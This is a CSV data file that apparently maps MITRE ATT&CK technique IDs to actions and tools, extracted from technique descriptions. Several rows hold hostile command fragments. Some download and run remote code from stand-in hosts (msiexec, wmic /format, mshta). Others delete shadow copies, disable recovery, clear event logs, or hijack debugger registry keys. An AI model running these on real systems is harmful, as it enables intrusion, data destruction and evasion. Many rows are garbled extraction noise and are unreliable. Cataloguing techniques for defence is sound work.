id,what,where
t1134,use,setthreadtoken
t1134,create,new logon session
t1134,use,cobalt strike beacon payload
t1134,use,logonuser
t1134,use,duplicatetoken ex
t1134,use,metasploit?s meterpreter payload
t1134,use,token stealing
t1135,use,net share
t1135,use,net utility
t1135,use,net view \remotesystem
t1136,use,net utility
t1136,use,net user command
t1137,modify,globaldotname registry key
t1137,hijack,application's search order
t1139,use,.bash_history file
t1139,use,~/.bash_history file
t1140,use,powershell
t1140,use,scripting
t1140,use,windows copy
t1140,use,certutil
t1140,use,built in functionality of malware
t1141,use,fake installer
t1141,use,fake promt
t1141,use,fake malware removal site
t1141,use,powershell
t1141,use,applescript
t1143,abuse,plist file tag apple.awt.uielement
t1143,abuse,vbscript
t1143,abuse,powershell.exe  windowstyle hidden
t1143,abuse,jscript
t1143,use,plist file tag apple.awt.uielement
t1143,use,vbscript
t1143,abuse,scripting language
t1143,use,powershell.exe  windowstyle hidden
t1144,load app,optical disk
t1144,use,path
t1144,load app,usb flash drive
t1144,use,to
t1144,load app,drive shared over the local network
t1144,use,myapp.app
t1144,use,xattr command xattr
t1144,load app,drive by download
t1145,use,mimikatz's crypto::extract module
t1145,use,brute force technique
t1145,use,invoke sessiongopher
t1145,use,keylogger
t1145,search,key directory
t1145,search,file extension
t1146,use,".bash_history"""
t1146,search,".bash_historyfile"""
t1146,search,"""~"
t1146,use,command unset histfile
t1146,use,""" rm ~"
t1146,search,environment variable histfile
t1146,use,history  c
t1147,create,account technique with a userid under 500
t1147,set,hide500users property value
t1147,enable,hide500users property value
t1147,use,users
t1147,use,sudo dscl .  create
t1147,use,username uniqueid 401
t1148,prepend,space before terminal command
t1148,set,ignoreboth
t1148,set,ignoredups
t1149,modify,lc_main
t1149,modify,lc_thread
t1150,modify,/library/preferences
t1151,rename,file
t1151,change,file extension
t1151,append,space
t1152,use,launchctl command
t1152,use,"""launchctl submit  l"
t1152,use,path
t1152,use,"execute arg arg arg"""
t1152,use,thing
t1152,use,to
t1153,,source /path/to/filename [arguments]
t1153,,. /path/to/filename [arguments]
t1154,use,trap 'command list' signals
t1154,use,trap command
t1155,use,osascript
t1155,use,command line arguments
t1156,insert,shell command
t1157,use,dylib hyjacking
t1158,put,"""."" as the first character in the file or folder name"
t1158,use,attrib.exe
t1158,use,graphical user interface
t1158,use,uf_hidden flag
t1159,use,$home/library/launchagents
t1159,disguise,/library/launchagents
t1159,use,agent name
t1159,disguise,launchd/launchctl
t1159,use,/library/launchagents
t1159,disguise,$home/library/launchagents
t1159,disguise,system/library/launchagents
t1159,use,system/library/launchagents
t1159,disguise,agent name
t1160,use,system/library/launchdaemons
t1160,use,launchd/launchctl
t1160,disguise,/library/launchdaemons
t1160,use,agent name
t1160,use,/library/launchdaemons
t1160,disguise,launchd/launchctl
t1160,disguise,agent name
t1161,remove,lc_code_signature
t1162,use,applescript
t1162,use,scripting language
t1162,use,api method smloginitemsetenabled
t1163,modify,rc.common file
t1164,modify,~/library/preferences/byhost/com.apple.loginwindow.* .plist
t1164,modify,~/library/preferences/com.apple.loginwindow.plist
t1166,use,chmod u+s [file
t1166,use,chmod 4777 [file]
t1168,modify,plist file
t1168,modify,cron.d file
t1168,use,cron tab
t1168,use,cron job
t1168,use,launchd
t1168,use,cron daemon
t1169,modify,sudoers file
t1170,use,
t1170,use,mshta.exe
t1170,use,msta
t1170,use,payload[.]hta
t1170,use,mshta http[:]
t1170,use,webserver
t1170,use,"payload[.]sct"""" """
t1170,use,"vbscript:close execute ""getobject """"script:https[:]"
t1171,respond,udp 137 traffic
t1171,use,network sniffing tool
t1171,use,nbnspoof
t1171,use,traffic monitoring tool
t1171,use,responder
t1171,use,tool
t1171,respond,llmnr
t1171,respond,udp 5355
t1171,use,metasploit
t1171,use,brute force
t1172,use,tls header sni field are not equal to http header
t1172,use,tls and http
t1173,use,embedded file
t1175,use,dcom
t1175,use,com
t1176,use,social engineering
t1176,masquerade,legitimate extension
t1177,add,driver
t1177,use,dll search order hijacking technique
t1177,use,dll side loading technique
t1177,replace,driver
t1178,use,sid history injection technique
t1179,overwrite,first byte of api function
t1179,use,hokking procedure
t1179,inject,program
t1179,modify,process iat
t1179,spawn,system thread
t1179,modify,iat pointers to createwindowex
t1180,modify,hkcu\control panel\desktop\scrnsave.exe
t1180,modify,hkcu\control panel\desktop\screensaverissecure
t1180,modify,hkcu\control panel\desktop\screensavertimeout
t1181,write code,ewm
t1181,write code,extra window memory
t1181,write payload,extra window memory
t1181,place pointer,ewm
t1181,write payload,ewm
t1181,place pointer,extra window memory
t1182,use,hkey_local_machine\system\currentcontrolset\control\session manager
t1182,use,application programming interface  api  functions /createprocess/createprocessasuser/ createprocesswithloginw/createprocesswithtokenw/winexec/
t1183,,d c:\temp\evil.exe causing a malicious executable to be loaded and run
t1183,,v globalflag
t1183,,d 1reg add hklm\software\microsoft\windows nt\currentversion\silentprocessexit\notepad.exe
t1183,,v reportingmode
t1183,,d 512reg add hklm\software\microsoft\windows nt\currentversion\silentprocessexit\notepad.exe
t1183,,reg add hklm\software\microsoft\windows nt\currentversion\image file execution options\notepad.exe
t1183,,t reg_dword
t1183,,v monitorprocess
t1184,compromise,ssh agent
t1184,use,agent socket
t1185,use,security vulnerability
t1185,use,browser functionality
t1185,set,http proxy
t1186,use,legitimate executable
t1186,use,process doppelganging
t1186,use,txf transaction
t1186,use,windows transactional ntfs
t1187,point,external reference
t1187,use,file[:]
t1187,use,normal.dotm
t1187,force,smb authentication
t1187,use,
t1187,use,spearphishing
t1187,use,[remote address]
t1188,use,tor
t1188,use,several proxy
t1189,use,built in web application interface
t1189,use,cross site scripting
t1189,use,javascript
t1190,use,command
t1190,use,software
t1190,use,ssh
t1190,use,databases
t1190,use,web servers
t1190,use,standard services
t1190,use,data
t1190,use,smb
t1190,use,sql
t1191,infect inf file,malicious command
t1192,attach,link with social engineering text
t1193,use,executable
t1193,use,microsoft office document
t1193,use,archived file
t1193,use,pdf
t1194,ask about,policy/ software
t1194,leverage,non enterprise controlled service
t1194,leverage,socail media
t1194,leverage,personal webmail
t1194,ask about,job opportunity/service
t1194,leverage,user execution
t1195,,code
t1195,,image
t1195,use,open source code
t1195,,selling s
t1196,use,programmatically
t1196,use,application programming interface  api  call
t1197,invoke,"program when a job complete or error """"hklm\hardware\description\system\""""systembiosversion"""""""
t1197,create,long standing job
t1198,modify,hklm\software[wow6432node]microsoft\cryptography\oid\encodingtype 0\cryptsipdllverifyindirectdata{{sip_guid}} to the dll providing a sip?s cryptsipdllverifyindirectdata function
t1198,modify,hklm\software[wow6432node]microsoft\cryptography\providers\trust\finalpolicy{{trust provider guid}} the dll providing a trust provider?s finalpolicy function
t1198,modify,funcname registry value
t1198,point,malicious dll
t1198,modify,dll  registry value
t1199,use,trusted third party relationship
t1201,use,cat /etc/pam.d/common password
t1201,use,net accounts /domain
t1201,use,net accounts
t1201,use,pwpolicy getaccountpolicies
t1202,use,run window
t1202,use,forfiles
t1202,use,components of the windows subsystem for linux  wsl
t1202,use,the program compatibility assistant  pcalua.exe
t1202,use,scripts
t1203,use,spearphishing via service  technique
t1203,use,spearphishing attachment technique
t1203,use,spearphishing link technique
t1203,use,drive by compromise technique
t1204,deliver,spearphishing link technique
t1204,deliver,spearphishing attachment technique
t1204,use,spearphishing attachment technique
t1204,use,spearphishing link technique
t1205,use,libcap libraries
t1206,disable,tty_tickets
t1207,create,new server and ntdsdsa object
t1207,delete,associated metadata
t1207,manipulate,ad object
t1207,register,rouge dc
t1207,manipulate,account
t1207,manipulate,schema
t1207,alter,associated metadata
t1207,alter,replication
t1207,manipulate,access control list
t1207,delete,replication
t1208,perform,valid account technique
t1208,perform,brute force technique
t1209,use,time provider registry key
t1209,use,hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\
t1210,take advantage,error
t1211,reconnaissance,vulnerability
t1211,reconnaissance,security software discovery technique
t1214,use,"reg query hklm /f password /t reg_sz /s,reg query hkcu /f password /t reg_sz /s"
t1214,use,reg utility
t1216,,hi.png
t1216,,cscript c[:]\windows\system32\printing_admin_scripts\en us\pubprn[.]vbs 127.0.0.1 script:http[:]
t1216,,192.168.1.100
t1218,,regsvr option
t1218,,odbcconf.exe /s /a {regsvr c:\users\public\file.dll}
t1218,,c:\program files\common files\microsoft shared\clicktorun\mavinject32.exe <pid> /injectrunning <path dll>
t1218,,msiexec.exe /y c:\path\to\file.dll
t1218,,msiexec.exe /q /i c:\path\to\file.msi
t1218,,c:\windows\system32\mavinject.exe <pid> /injectrunning <path dll>
t1219,use,logmein
t1219,use,remote access software
t1219,use,desktop support software
t1219,use,remote access tool
t1219,use,ammyyadmin
t1219,use,go2assit
t1219,use,team viewer
t1220,use,msxsl.exe script[.]jpeg script[.]jpeg
t1220,use,wmic process list /format:evil[.]xsl
t1220,use,"wmic os get /format:""https[:]//example[.]com/evil[.]xsl"""
t1220,use,msxsl.exe customers[.]xml script[.]xsl
t1220,use,msxsl.exe script[.]xsl script[.]xsl
t1221,using,template injection
t1222,change,specific access right
t1223,use,user execution technique
t1223,deliver,custom chm file containing embedded payload
t1480,use,environment specific value
t1480,use,physical device
t1480,use,joined active directory  ad  domains
t1480,use,target specific value
t1480,use,""" local"
t1480,use,"software version"""
t1480,use,network share names
t1480,use,""" software"
t1480,use,"external ip addresse"""
t1480,use,attached physical devices
t1481,post,dead drop resolver
t1482,use,.net methods
t1482,use,dsenumeratedomaintrusts   win32 api call
t1482,use,ldap
t1483,concatenate,words together
t1484,modify,"""<gpo_path>\machine\preferences\scheduledtasks\scheduledtasks.xml"""
t1484,use,new gpoimmediatetask script
t1484,use,seenabledelegationprivilege
t1484,set,<gpo_path>\machine\microsoft\windows nt\secedit\gpttmpl.inf
t1485,use,command line argument
t1485,use,del
t1487,overwrite,critical data
t1488,use,third part tool
t1488,use,rawdisk
t1489,,
t1490,use,"quiet"""
t1490,use,"""bcdedit.exe"
t1490,use,all
t1490,use,bcdedit.exe
t1490,use,wbadmin.exe
t1490,use,"set {{default}} recoveryenabled no"""
t1490,use,wmi
t1490,use,vssadmin.exe
t1490,use,"""wmic shadowcopy delete"""
t1490,use,native windows utility
t1490,use,set {{default}} bootstatuspolicy ignoreallfailures & bcdedit
t1490,use,"""wbadmin.exe delete catalog  quiet"""
t1493,intercept,data between process
t1494,alter,application binary
t1495,overwrite,non volatile
t1496,use,recource hijecking
t1497,check/search,"memory/ process/ file system/the registry/drive size/user activity/browser history/cache/bookmark/number of files in the home directories/speed of mouse click/ frequency of mouse click/fan/temperature/cpu check/security monitoring tool/sysinternals/wireshark/""hklm\software\oracle\virtualbox guest additions""/
t1060,modify,hkey_local_machine\software\microsoft\windows\currentversion\runonce
t1045,use,mpress
t1146,use,export histfilesize=0
t1085,use,document.write
t1201,use,chage  l
t1157,use,same name in higher up search path
t1087,acquire information,dscacheutil  q group
t1094,use,custom command and control protocol
t1081,use,group policy preference
t1110,use,pass the hash technique
t1195,,w
t1095,use,user datagram protocol
t1079,use,protocol encryption scheme
t1483,incorporate,seed value
t1199,use,valid account
t1060,create,nt\currentversion\winlogon\shellhkey_current_user\software\microsoft\windows\currentversion\policies\explorer\run
t1091,modify,media
t1042,use,hkey_classes_root[handler]
t1087,use,get msolrolemember powershell cmdlet
t1143,use,scripting language
t1069,use,dscl .  list /groups
t1087,use,passwd"""""""
t1497,enumerate,"""vmware""""/
t1054,use,powershell
t1050,use,utility
t1014,incercept,operating system api call
t1168,modify,crontab file
t1490,use,""vssadmin.exe delete shadows"""
t1497,check/search,"""vmware""""/
t1004,modify,winlogon registry key
t1497,check/search,service/nstalled program/manufacturer field/product field/vme specific hardware instruction/vme specific processor instruction
t1095,use,transport layer protocol
t1114,access,email forwarding rule
t1198,modify,hklm\software[\wow6432node]microsoft\cryptography\oid\encodingtype 0\cryptsipdllgetsigneddatamsg{{sip_guid}} to the dll providing sip?s cryptsipdllgetsigneddatamsg function
t1001,use,non standard data encoding system
t1048,use,internet web service
t1150,modify,~/library/preferences
t1144,load app,external hard drive
t1196,double click,double click the file
t1493,intercept,data over connection
t1021,use,ssh
t1135,use,df  ah
t1047,use,remote procedure call service
t1022,use,aes
t1166,use,chmod via bitmasking
t1183,register,malicious debugger
t1110,use,management service
t1106,use,createprocess   api
t1171,respond,nbt ns
t1064,interact,operating system at api label
t1064,,veil
t1048,use,h
t1160,disguise,system/library/launchdaemons
t1500,use,mingw
t1032,employ,rc6
t1220,use,msxsl.exe/wmi/windows management instrumentation
t1497,use,service/nstalled program/manufacturer field/product field/vme specific hardware instruction/vme specific processor instruction
t1083,use,dir/tree
t1052,use,usb drive
t1055,use,mem
t1069,use,groups
t1096,use,ads
t1130,use,path
t1003,use,mimipenguin tool
t1088,use,eventvwr.exe
t1497,enumerate,service/nstalled program/manufacturer field/product field/vme specific hardware instruction/vme specific processor instruction
t1003,use,text string/regex pattern
t1192,accompany,link with social engineering text
t1130,use,system.keychain
t1061,use,remote interactive session technique
t1143,use,powershell
t1090,use,zxproxy
t1082,use,ver utility
t1055,write dll path,process
t1159,use,launchd/launchctl
t1070,use,wevtutil cl system
t1142,use,security command line utility
t1497,use,""wmi query $q = """"select * from win32_fan"""" get wmiobject  query $q""""/information learnt on automated discovery technique/security software discovery technique/windows management instrumentation technique/powershell technique/systeminfo technique/the query registry  technique/scripting technique/sleep/timer/loop/ win32 deviceiocontrol function/special i/o port to send commands and receive output"""
t1497,check/search,"""wmi query $q = ""select * from win32_fan"" get wmiobject  query $q""/information learnt on automated discovery technique/security software discovery technique/windows management instrumentation technique/powershell technique/systeminfo technique/the query registry  technique/scripting technique/sleep/timer/loop/ win32 deviceiocontrol function/special i/o port to send commands and receive output"
t1497,enumerate,"""wmi query $q = ""select * from win32_fan"" get wmiobject  query $q""/information learnt on automated discovery technique/security software discovery technique/windows management instrumentation technique/powershell technique/systeminfo technique/the query registry  technique/scripting technique/sleep/timer/loop/ win32 deviceiocontrol function/special i/o port to send commands and receive output"
t1497,use,"""vmware""""/
t1096,use,mft
t1032,employ,3des
t1483,generate,different domain
t1027,use,language specific semantic
t1218,,msiexec.exe /q /i http[:]//site[.]com/file.msi
t1116,create,certificate
t1060,create,hkey_local_machine\software\microsoft\windows
t1140,use,b command
t1021,use,valid account technique
t1092,use,replication through removable media technique
t1108,credentialed access,remote service
t1168,use,at program
t1173,use,dde command
t1132,use,mime
t1106,use,createprocesswithtokenw   api
t1003,use,""reg save hklm\system system"""""""
t1497,use,"memory/ process/ file system/the registry/drive size/user activity/browser history/cache/bookmark/number of files in the home directories/speed of mouse click/ frequency of mouse click/fan/temperature/cpu check/security monitoring tool/sysinternals/wireshark/""hklm\software\oracle\virtualbox guest additions""/
t1480,use,filename
t1048,use,ftp
t1060,use,masquerading
t1187,use,template injection
t1066,use,updated version
t1114,create,cache files/ .pst / .ost
t1110,use,brute force technique
t1137,,hkey_current_user\software\microsoft\office test\special\perf
t1143,abuse,powershell
t1018,use,c:\windows\system32\drivers\etc\hosts file
t1022,use,custom algorithm
t1196,use,spearphishing attachment
t1032,use,xor
t1060,modify,hkey_current_user\software\microsoft\windows\currentversion\explorer\shell folders
t1137,crafted,html page
t1071,use,http
t1106,use,createprocessinternalw   api
t1107,use,windows sysinternals sdelete
t1189,use,iframes
t1116,forge,certificate
t1036,move executable,trusted location
t1055,create,suspended process
t1032,use,plink utility
t1022,use,utility
t1134,dulicate,existing token
t1180,modify,hkcu\control panel\desktop\screensaveactive
t1021,use,remote service
t1069,use,net group /domain
t1114,create,webmail application/outlook web access
t1143,use,jscript
t1014,hook,operating system api call
t1090,use,zxportmsp
t1051,use,network file share
t1480,use,system time
t1032,use,tls
t1076,use,credential access technique
t1124,use,net
t1087,use,azure cli
t1085,use,getobject """"script:https[:]//www[.]example[.]com/malicious.sct"""" """""""
t1497,enumerate,"memory/ process/ file system/the registry/drive size/user activity/browser history/cache/bookmark/number of files in the home directories/speed of mouse click/ frequency of mouse click/fan/temperature/cpu check/security monitoring tool/sysinternals/wireshark/""hklm\software\oracle\virtualbox guest additions""/
t1092,use,removable media
t1032,employ,openssl
t1105,use,command and control channel
t1124,use,tz'
t1118,use,trusted windows utility
t1071,use,standardized application layer protocol
t1194,leverage,social media services
t1087,acquire information,net group
t1022,use,
t1034,create program,improperly specified program
t1149,modify,lc_unixthread
t1205,send,series of packet
t1043,use,udp:22  ssh
t1032,use,3des
t1499,use,tls protocol
t1043,use,tcp:80  http
t1196,use,command line
t1192,use,browser exploit
t1485,use,rm
t1096,use,master file table
t1130,use,library
t1499,use,service exhaustion flood
t1090,use,port redirection
t1020,use,exfiltration over command and control channel technique
t1486,withhold,decryption key
t1002,use,algorithm
t1074,use,data encrypted technique
t1117,pass,uniform resource locator
t1087,use,id"""""""
t1498,use,direct network flood
t1498,use,icmp
t1498,use,reflection amplification
t1498,use,ntp
t1498,use,botnet
t1498,use,dns
t1498,use,memcache protocol
t1498,use,udp
t1499,use,syn flood
t1499,use,"""ssl"
t1499,exploit,vulnerability
t1499,use,os exhaustion flood
t1499,use,application exhaustion flood
t1499,use,botnet
t1499,use,ack flood
t1499,use,system exploitation
t1499,use,application exploitation
t1499,use,simple http flood
t1499,use,ssl renegotiation attack
t1500,use,spearphishing attachment technique
t1500,use,csc.exe
t1500,use,gcc
t1501,,create
t1501,,modify
